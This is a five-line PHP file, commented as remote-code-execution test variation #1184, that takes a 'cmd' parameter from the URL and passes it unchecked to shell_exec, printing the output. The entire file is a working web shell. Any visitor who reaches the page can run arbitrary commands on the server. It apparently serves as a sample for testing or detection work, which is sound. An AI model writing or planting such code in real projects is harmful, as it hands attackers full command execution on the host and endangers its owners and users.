<?php
// RCE test variation #1184
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>